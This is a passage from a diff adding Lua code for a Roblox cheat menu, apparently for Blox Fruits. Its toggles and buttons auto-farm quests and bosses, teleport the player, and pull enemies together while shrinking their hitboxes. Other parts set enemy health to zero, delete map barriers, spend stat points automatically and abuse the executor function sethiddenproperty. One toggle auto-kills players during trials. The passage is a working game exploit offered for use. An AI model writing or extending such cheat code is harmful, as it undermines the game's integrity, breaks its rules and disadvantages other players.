+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Swan Pirate") then
+							Ms = "Swan Pirate";
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == Ms then
+									pcall(function()
+										repeat
+											task.wait(_G.FastAttackDelay);
+											sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+											EquipWeapon(_G.SelectWeapon);
+											AutoHaki();
+											v.HumanoidRootPart.Transparency = 1;
+											v.HumanoidRootPart.CanCollide = false;
+											v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											PosMon = v.HumanoidRootPart.CFrame;
+											MonFarm = v.Name;
+											AttackNoCD();
+											StartBring = true;
+										until not v.Parent or v.Humanoid.Health <= 0 or _G.AutoBartilo == false or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+										StartBring = false;
+									end);
+								end;
+							end;
+						else
+							repeat
+								topos(CFrame.new(932.624451, 156.106079, 1180.27466, -0.973085582, 0.0000000455137119, -0.230443969, 0.0000000267024713, 1, 0.0000000847491108, 0.230443969, 0.0000000763147128, -0.973085582));
+								wait();
+							until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(932.624451, 156.106079, 1180.27466, (-0.973085582), 0.0000000455137119, (-0.230443969), 0.0000000267024713, 1, 0.0000000847491108, 0.230443969, 0.0000000763147128, (-0.973085582))).Magnitude <= 10;
+						end;
+					else
+						repeat
+							topos(CFrame.new(-456.28952, 73.0200958, 299.895966));
+							wait();
+						until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-456.28952), 73.0200958, 299.895966)).Magnitude <= 10;
+						wait(1.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", "BartiloQuest", 1);
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.Data.Level.Value >= 800 and (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 1 then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Jeremy") then
+						Ms = "Jeremy";
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == Ms then
+								OldCFrameBartlio = v.HumanoidRootPart.CFrame;
+								repeat
+									task.wait(_G.FastAttackDelay);
+									EquipWeapon(_G.SelectWeapon);
+									AutoHaki();
+									v.HumanoidRootPart.Transparency = 1;
+									v.HumanoidRootPart.CanCollide = false;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									v.HumanoidRootPart.CFrame = OldCFrameBartlio;
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not v.Parent or v.Humanoid.Health <= 0 or _G.AutoBartilo == false;
+							end;
+						end;
+					elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Jeremy [Lv. 850] [Boss]") then
+						repeat
+							topos(CFrame.new(-456.28952, 73.0200958, 299.895966));
+							wait();
+						until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-456.28952), 73.0200958, 299.895966)).Magnitude <= 10;
+						wait(1.1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo");
+						wait(1);
+						repeat
+							topos(CFrame.new(2099.88159, 448.931, 648.997375));
+							wait();
+						until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(2099.88159, 448.931, 648.997375)).Magnitude <= 10;
+						wait(2);
+					else
+						repeat
+							topos(CFrame.new(2099.88159, 448.931, 648.997375));
+							wait();
+						until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(2099.88159, 448.931, 648.997375)).Magnitude <= 10;
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.Data.Level.Value >= 800 and (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 2 then
+					repeat
+						topos(CFrame.new(-1850.49329, 13.1789551, 1750.89685));
+						wait();
+					until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-1850.49329), 13.1789551, 1750.89685)).Magnitude <= 10;
+					wait(1);
+					repeat
+						topos(CFrame.new(-1858.87305, 19.3777466, 1712.01807));
+						wait();
+					until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-1858.87305), 19.3777466, 1712.01807)).Magnitude <= 10;
+					wait(1);
+					repeat
+						topos(CFrame.new(-1803.94324, 16.5789185, 1750.89685));
+						wait();
+					until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-1803.94324), 16.5789185, 1750.89685)).Magnitude <= 10;
+					wait(1);
+					repeat
+						topos(CFrame.new(-1858.55835, 16.8604317, 1724.79541));
+						wait();
+					until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-1858.55835), 16.8604317, 1724.79541)).Magnitude <= 10;
+					wait(1);
+					repeat
+						topos(CFrame.new(-1869.54224, 15.987854, 1681.00659));
+						wait();
+					until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-1869.54224), 15.987854, 1681.00659)).Magnitude <= 10;
+					wait(1);
+					repeat
+						topos(CFrame.new(-1800.0979, 16.4978027, 1684.52368));
+						wait();
+					until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-1800.0979), 16.4978027, 1684.52368)).Magnitude <= 10;
+					wait(1);
+					repeat
+						topos(CFrame.new(-1819.26343, 14.795166, 1717.90625));
+						wait();
+					until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-1819.26343), 14.795166, 1717.90625)).Magnitude <= 10;
+					wait(1);
+					repeat
+						topos(CFrame.new(-1813.51843, 14.8604736, 1724.79541));
+						wait();
+					until not _G.AutoBartilo or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-1813.51843), 14.8604736, 1724.79541)).Magnitude <= 10;
+				end;
+			end;
+		end;
+	end);
+end);
+ItemsTab:Toggle("Auto Holy Torch", _G.AutoHolyTorch, false, function(value)
+	_G.AutoHolyTorch = value;
+	StopTween(_G.AutoHolyTorch);
+end);
+spawn(function()
+	while wait(0.5) do
+		pcall(function()
+			if _G.AutoHolyTorch then
+				if game.Players.LocalPlayer.Backpack:FindFirstChild("Holy Torch") or game.Players.LocalPlayer.Character:FindFirstChild("Holy Torch") then
+					repeat
+						wait(0.2);
+						EquipWeapon("Holy Torch");
+						TP1(CFrame.new(-10752.4434, 415.261749, -9367.43848, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+					until (Vector3.new((-10752.4434), 415.261749, (-9367.43848)) - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5;
+					wait(2);
+					repeat
+						wait(0.2);
+						EquipWeapon("Holy Torch");
+						TP1(CFrame.new(-11671.6289, 333.78125, -9474.31934, 0.300932229, 0, -0.953645527, 0, 1, 0, 0.953645527, 0, 0.300932229));
+					until (Vector3.new((-11671.6289), 333.78125, (-9474.31934)) - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5;
+					wait(2);
+					repeat
+						wait(0.2);
+						EquipWeapon("Holy Torch");
+						TP1(CFrame.new(-12133.1406, 521.507446, -10654.292, 0.80428642, 0, -0.594241858, 0, 1, 0, 0.594241858, 0, 0.80428642));
+					until (Vector3.new((-12133.1406), 521.507446, (-10654.292)) - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5;
+					wait(2);
+					repeat
+						wait(0.2);
+						EquipWeapon("Holy Torch");
+						TP1(CFrame.new(-13336.127, 484.521179, -6985.31689, 0.853732228, 0, -0.520712316, 0, 1, 0, 0.520712316, 0, 0.853732228));
+					until (Vector3.new((-13336.127), 484.521179, (-6985.31689)) - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5;
+					wait(2);
+					EquipWeapon("Holy Torch");
+					repeat
+						wait(0.2);
+						TP1(CFrame.new(-13487.623, 336.436188, -7924.53857, -0.982848108, 0, 0.184417039, 0, 1, 0, -0.184417039, 0, -0.982848108));
+					until (Vector3.new((-13487.623), 336.436188, (-7924.53857)) - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5;
+					wait(2);
+					Com();
+					wait(20);
+				end;
+			end;
+		end);
+	end;
+end);
+
+-- Always Bring
+spawn(function()
+	while wait() do
+		pcall(function()
+			for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+				if _G.BringMonster then
+					if v.Name == MonFarm and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+						if v.Name == "Factory Staff" then
+							if (v.HumanoidRootPart.Position - PosMon.Position).Magnitude <= 500 then
+								v.Head.CanCollide = false;
+								v.HumanoidRootPart.CanCollide = false;
+								v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+								v.HumanoidRootPart.CFrame = PosMon;
+								if v.Humanoid:FindFirstChild("Animator") then
+									v.Humanoid.Animator:Destroy();
+								end;
+								sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+							end;
+						elseif v.Name == MonFarm then
+							if (v.HumanoidRootPart.Position - PosMon.Position).Magnitude <= _G.BringMode then
+								v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+								v.HumanoidRootPart.CFrame = PosMon;
+								v.HumanoidRootPart.CanCollide = false;
+								v.Head.CanCollide = false;
+								if v.Humanoid:FindFirstChild("Animator") then
+									v.Humanoid.Animator:Destroy();
+								end;
+								sethiddenproperty((game:GetService("Players")).LocalPlayer, "SimulationRadius", math.huge);
+							end;
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+StatsTab:Seperator("Stats");
+local Pointstat = StatsTab:Label("Stat Points");
+spawn(function()
+	while wait() do
+		pcall(function()
+			Pointstat:Set("Stat Points : " .. tostring((game:GetService("Players")).LocalPlayer.Data.Points.Value));
+		end);
+	end;
+end);
+StatsTab:Toggle("Melee", false, "Auto Add Meele Stats", function(Value)
+	melee = Value;
+end);
+StatsTab:Toggle("Defense", false, "Auto Add Defense Stats", function(value)
+	defense = value;
+end);
+StatsTab:Toggle("Sword", false, "Auto Add Sword Stats", function(value)
+	sword = value;
+end);
+StatsTab:Toggle("Gun", false, "Auto Add Gun Stats", function(value)
+	gun = value;
+end);
+StatsTab:Toggle("Devil Fruit", false, "Auto Add Fruit Stats", function(value)
+	demonfruit = value;
+end);
+PointStats = 1;
+StatsTab:Slider("Point", 1, 100, PointStats, function(value)
+	PointStats = value;
+end);
+spawn(function()
+	while wait() do
+		if game.Players.localPlayer.Data.Points.Value >= PointStats then
+			if melee then
+				local args = {
+					[1] = "AddPoint",
+					[2] = "Melee",
+					[3] = PointStats
+				};
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+			end;
+			if defense then
+				local args = {
+					[1] = "AddPoint",
+					[2] = "Defense",
+					[3] = PointStats
+				};
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+			end;
+			if sword then
+				local args = {
+					[1] = "AddPoint",
+					[2] = "Sword",
+					[3] = PointStats
+				};
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+			end;
+			if gun then
+				local args = {
+					[1] = "AddPoint",
+					[2] = "Gun",
+					[3] = PointStats
+				};
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+			end;
+			if demonfruit then
+				local args = {
+					[1] = "AddPoint",
+					[2] = "Demon Fruit",
+					[3] = PointStats
+				};
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+			end;
+		end;
+	end;
+end);
+StatsTab:Line();
+local Melee = StatsTab:Label("Melee : ");
+local Defense = StatsTab:Label("Defense : ");
+local Sword = StatsTab:Label("Sword : ");
+local Gun = StatsTab:Label("Gun : ");
+local Fruit = StatsTab:Label("Fruit : ");
+spawn(function()
+	while wait() do
+		pcall(function()
+			Melee:Set("Melee : " .. game.Players.localPlayer.Data.Stats.Melee.Level.Value);
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			Defense:Set("Defense : " .. game.Players.localPlayer.Data.Stats.Defense.Level.Value);
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			Sword:Set("Sword : " .. game.Players.localPlayer.Data.Stats.Sword.Level.Value);
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			Gun:Set("Gun : " .. game.Players.localPlayer.Data.Stats.Gun.Level.Value);
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			Fruit:Set("Fruit : " .. game.Players.localPlayer.Data.Stats["Demon Fruit"].Level.Value);
+		end);
+	end;
+end);
+if World1 or World2 then
+	RaceV4Tab:Label("Go to Third Sea");
+end;
+if World3 then
+	RaceV4Tab:Seperator("Race V2");
+	RaceV4Tab:Toggle("Auto Evo Race [ V2 ]", _G.Auto_EvoRace, false, function(value)
+		_G.Auto_EvoRace = value;
+		StopTween(_G.Auto_EvoRace);
+	end);
+	spawn(function()
+		pcall(function()
+			while wait(0.1) do
+				if _G.Auto_EvoRace then
+					if not (game:GetService("Players")).LocalPlayer.Data.Race:FindFirstChild("Evolved") then
+						if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Alchemist", "1") == 0 then
+							topos(CFrame.new(-2779.83521, 72.9661407, -3574.02002, -0.730484903, 0.0000000639014104, -0.68292886, 0.0000000359963224, 1, 0.0000000550667032, 0.68292886, 0.0000000156424669, -0.730484903));
+							if (Vector3.new((-2779.83521), 72.9661407, (-3574.02002)) - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 4 then
+								wait(1.3);
+								(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Alchemist", "2");
+							end;
+						elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Alchemist", "1") == 1 then
+							pcall(function()
+								if not (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Flower 1") and (not (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Flower 1")) then
+									topos((game:GetService("Workspace")).Flower1.CFrame);
+								elseif not (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Flower 2") and (not (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Flower 2")) then
+									topos((game:GetService("Workspace")).Flower2.CFrame);
+								elseif not (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Flower 3") and (not (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Flower 3")) then
+									if (game:GetService("Workspace")).Enemies:FindFirstChild("Zombie") then
+										for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+											if v.Name == "Zombie" then
+												repeat
+													task.wait(_G.FastAttackDelay);
+													AutoHaki();
+													EquipWeapon(_G.SelectWeapon);
+													topos(v.HumanoidRootPart.CFrame * Pos);
+													v.HumanoidRootPart.CanCollide = false;
+													v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+													AttackNoCD();
+													PosMon = v.HumanoidRootPart.CFrame;
+													MonFarm = v.Name;
+													StartBring = true;
+												until (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Flower 3") or (not v.Parent) or v.Humanoid.Health <= 0 or _G.Auto_EvoRace == false;
+												StartBring = false;
+											end;
+										end;
+									else
+										topos(CFrame.new(-5685.9233398438, 48.480125427246, -853.23724365234));
+									end;
+								end;
+							end);
+						elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Alchemist", "1") == 2 then
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Alchemist", "3");
+						end;
+					end;
+				end;
+			end;
+		end);
+	end);
+	RaceV4Tab:Seperator("Race V4");
+	RaceV4Tab:Button("Teleport To Top Of GreatTree", function()
+		topos(CFrame.new(2947.556884765625, 2281.630615234375, -7213.54931640625));
+	end);
+	RaceV4Tab:Button("Teleport To Timple Of Time", function()
+		(game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28286.35546875, 14895.3017578125, 102.62469482421875);
+	end);
+	RaceV4Tab:Button("Teleport To Lever Pull", function()
+		topos(CFrame.new(28575.181640625, 14936.6279296875, 72.31636810302734));
+	end);
+	RaceV4Tab:Button("Teleport To Acient One", function()
+		topos(CFrame.new(28981.552734375, 14888.4267578125, -120.245849609375));
+	end);
+	RaceV4Tab:Button("Unlock Lever", function()
+		venyx:Notify("Unlocked");
+		if (game:GetService("Workspace")).Map["Temple of Time"].Lever.Prompt:FindFirstChild("ProximityPrompt") then
+			((game:GetService("Workspace")).Map["Temple of Time"].Lever.Prompt:FindFirstChild("ProximityPrompt")):Remove();
+		end;
+		wait(0.1);
+		local ProximityPrompt = Instance.new("ProximityPrompt");
+		ProximityPrompt.Parent = (game:GetService("Workspace")).Map["Temple of Time"].Lever.Prompt;
+		ProximityPrompt.MaxActivationDistance = 10;
+		ProximityPrompt.ActionText = "Secrets Beholds Inside";
+		ProximityPrompt.ObjectText = "An unknown lever of time";
+		function onProximity()
+			local part = (game:GetService("Workspace")).Map["Temple of Time"].MainDoor1;
+			local TweenService = game:GetService("TweenService");
+			local startPosition = part.Position;
+			local endPosition = startPosition + Vector3.new(0, (-50), 0);
+			local tweenInfo = TweenInfo.new(10, Enum.EasingStyle.Linear, Enum.EasingDirection.Out);
+			local tween = TweenService:Create(part, tweenInfo, {
+				Position = endPosition
+			});
+			tween:Play();
+			local partnew = (game:GetService("Workspace")).Map["Temple of Time"].MainDoor2;
+			local TweenService = game:GetService("TweenService");
+			local startPosition = partnew.Position;
+			local endPosition = startPosition + Vector3.new(0, (-50), 0);
+			local tweenInfo = TweenInfo.new(10, Enum.EasingStyle.Linear, Enum.EasingDirection.Out);
+			local tween = TweenService:Create(partnew, tweenInfo, {
+				Position = endPosition
+			});
+			tween:Play();
+			local SoundSFX = Instance.new("Sound");
+			SoundSFX.Parent = workspace;
+			SoundSFX.SoundId = "rbxassetid://1904813041";
+			SoundSFX:Play();
+			SoundSFX.Name = "POwfpxzxzfFfFF";
+			((game:GetService("Workspace")).Map["Temple of Time"].Lever.Prompt:FindFirstChild("ProximityPrompt")):Remove();
+			wait(5);
+			(workspace:FindFirstChild("POwfpxzxzfFfFF")):Remove();
+			(game:GetService("Workspace")).Map["Temple of Time"].NoGlitching:Remove();
+			(game:GetService("Workspace")).Map["Temple of Time"].NoGlitching:Remove();
+			(game:GetService("Workspace")).Map["Temple of Time"].NoGlitching:Remove();
+		end;
+		ProximityPrompt.Triggered:Connect(onProximity);
+	end);
+	RaceV4Tab:Button("Clock Acces", function()
+		(game:GetService("Workspace")).Map["Temple of Time"].DoNotEnter:Remove();
+		(game:GetService("Workspace")).Map["Temple of Time"].ClockRoomExit:Remove();
+	end);
+	RaceV4Tab:Toggle("Auto Buy Gear", _G.Auto_Farm_Bone4, false, function(value)
+		_G.Auto_Farm_Bone4 = value;
+		StopTween(_G.Auto_Farm_Bone4);
+	end);
+	spawn(function()
+		pcall(function()
+			while wait(0.1) do
+				if _G.Auto_Farm_Bone4 then
+					local args = {
+						[1] = true
+					};
+					local args = {
+						[1] = "UpgradeRace",
+						[2] = "Buy"
+					};
+					(((game:GetService("ReplicatedStorage")):WaitForChild("Remotes")):WaitForChild("CommF_")):InvokeServer(unpack(args));
+				end;
+			end;
+		end);
+	end);
+	RaceV4Tab:Toggle("Teleport To Mirage Island", _G.AutoMysticIsland, "Tween To Mirage Island", function(value)
+		_G.AutoMysticIsland = value;
+		StopTween(_G.AutoMysticIsland);
+	end);
+	RaceV4Tab:Toggle("Tween Gear", _G.TweenMGear, "Tween To Gear", function(value)
+		_G.TweenMGear = value;
+		StopTween(_G.TweenMGear);
+	end);
+	RaceV4Tab:Toggle("Auto Look Moon", false, "Camera Focus To Moon", function(v)
+		_G.AutoDooHee = v;
+	end);
+	RaceV4Tab:Toggle("Auto Active Race V3", _G.AutoAgility, false, function(value)
+		_G.AutoAgility = value;
+	end);
+	spawn(function()
+		while wait() do
+			pcall(function()
+				if _G.AutoDooHee then
+					wait();
+					local moonDir = game.Lighting:GetMoonDirection();
+					local lookAtPos = game.Workspace.CurrentCamera.CFrame.p + moonDir * 100;
+					game.Workspace.CurrentCamera.CFrame = CFrame.lookAt(game.Workspace.CurrentCamera.CFrame.p, lookAtPos);
+				end;
+			end);
+		end;
+	end);
+	RaceV4Tab:Toggle("Auto Ancient One Quest", _G.AutoRace, false, function(value)
+		_G.AutoRace = value;
+		StardFarm = value;
+		StopTween(_G.AutoRace);
+	end);
+	spawn(function()
+		pcall(function()
+			while wait() do
+				if _G.AutoRace then
+					if game.Players.LocalPlayer.Character.RaceTransformed.Value == true then
+						StardFarm = false;
+						topos(CFrame.new(216.211181640625, 126.9352035522461, -12599.0732421875));
+					end;
+				end;
+			end;
+		end);
+	end);
+	spawn(function()
+		while wait() do
+			if StardFarm and World3 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Cocoa Warrior") or (game:GetService("Workspace")).Enemies:FindFirstChild("Chocolate Bar Battler") or (game:GetService("Workspace")).Enemies:FindFirstChild("Sweet Thief") or (game:GetService("Workspace")).Enemies:FindFirstChild("Candy Rebel") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Cocoa Warrior" or v.Name == "Chocolate Bar Battler" or v.Name == "Sweet Thief" or v.Name == "Candy Rebel" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait(_G.FastAttackDelay);
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										AttackNoCD();
+									until not StardFarm or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						topos(CFrame.new(216.211181640625, 126.9352035522461, -12599.0732421875));
+					end;
+				end);
+			end;
+		end;
+	end);
+	spawn(function()
+		pcall(function()
+			while wait() do
+				if _G.AutoRace then
+					if game.Players.LocalPlayer.Character.RaceTransformed.Value == false then
+						StardFarm = true;
+					end;
+				end;
+			end;
+		end);
+	end);
+	spawn(function()
+		while wait() do
+			pcall(function()
+				if _G.AutoRace then
+					(game:GetService("VirtualInputManager")):SendKeyEvent(true, "Y", false, game);
+					wait(0.1);
+					(game:GetService("VirtualInputManager")):SendKeyEvent(false, "Y", false, game);
+				end;
+			end);
+		end;
+	end);
+	RaceV4Tab:Toggle("Disabled Inf Stairs", nil, false, function(value)
+		game.Players.LocalPlayer.Character.InfiniteStairs.Disabled = value;
+	end);
+	RaceV4Tab:Button("Teleport Cyborg Door", function()
+		topos(CFrame.new(28492.4140625, 14894.4267578125, -422.1100158691406));
+	end);
+	RaceV4Tab:Button("Teleport Fish Door", function()
+		topos(CFrame.new(28224.056640625, 14889.4267578125, -210.5872039794922));
+	end);
+	RaceV4Tab:Button("Teleport Ghoul Door", function()
+		topos(CFrame.new(28672.720703125, 14889.1279296875, 454.5961608886719));
+	end);
+	RaceV4Tab:Button("Teleport Human Door", function()
+		topos(CFrame.new(29237.294921875, 14889.4267578125, -206.94955444335938));
+	end);
+	RaceV4Tab:Button("Teleport Mink Door", function()
+		topos(CFrame.new(29020.66015625, 14889.4267578125, -379.2682800292969));
+	end);
+	RaceV4Tab:Button("Teleport Sky Door", function()
+		topos(CFrame.new(28967.408203125, 14918.0751953125, 234.31198120117188));
+	end);
+	RaceV4Tab:Seperator("Auto Complete Trials");
+	RaceV4Tab:Button("Buy Ancient One Quest", function(t)
+		(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("UpgradeRace", "Buy");
+	end);
+	RaceV4Tab:Toggle("Auto Kill Player in Trail", false, false, function(Val)
+		_G.AutoKillTial = Val;
+		StopTween(_G.AutoKillTial);
+	end);
+	RaceV4Tab:Toggle("Auto Trail RaceV4", false, false, function(v)
+		_G.AutoQuestRace = v;
+		StopTween(_G.AutoQuestRace);
+	end);
+	spawn(function()
+		pcall(function()
+			while wait() do
+				if _G.AutoQuestRace then
+					if (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Human" then
+						for i, v in pairs(game.Workspace.Enemies:GetDescendants()) do
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								pcall(function()
+									repeat
+										wait(0.1);
+										v.Humanoid.Health = 0;
+										v.HumanoidRootPart.CanCollide = false;
+									until not _G.AutoQuestRace or (not v.Parent) or v.Humanoid.Health <= 0;
+								end);
+							end;
+						end;
+					elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Skypiea" then
+						for i, v in pairs((game:GetService("Workspace")).Map.SkyTrial.Model:GetDescendants()) do
+							if v.Name == "snowisland_Cylinder.081" then
+								topos(v.CFrame * CFrame.new(0, 0, 0));
+							end;
+						end;
+					elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Fishman" then
+						for i, v in pairs((game:GetService("Workspace")).SeaBeasts.SeaBeast1:GetDescendants()) do
+							if v.Name == "HumanoidRootPart" then
+								topos(v.CFrame * Pos);
+								for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+									if v:IsA("Tool") then
+										if v.ToolTip == "Melee" then
+											game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+										end;
+									end;
+								end;
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 122, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 122, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.2);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 120, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 120, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.2);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 99, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 99, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+									if v:IsA("Tool") then
+										if v.ToolTip == "Blox Fruit" then
+											game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+										end;
+									end;
+								end;
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 122, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 122, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.2);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 120, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 120, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.2);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 99, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 99, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.5);
+								for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+									if v:IsA("Tool") then
+										if v.ToolTip == "Sword" then
+											game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+										end;
+									end;
+								end;
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 122, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 122, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.2);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 120, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 120, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.2);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 99, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 99, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.5);
+								for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+									if v:IsA("Tool") then
+										if v.ToolTip == "Gun" then
+											game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+										end;
+									end;
+								end;
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 122, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(false, 122, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
+								wait(0.2);
+								(game:GetService("VirtualInputManager")):SendKeyEvent(true, 120, false, game.Players.LocalPlayer.Character.HumanoidRootPart);
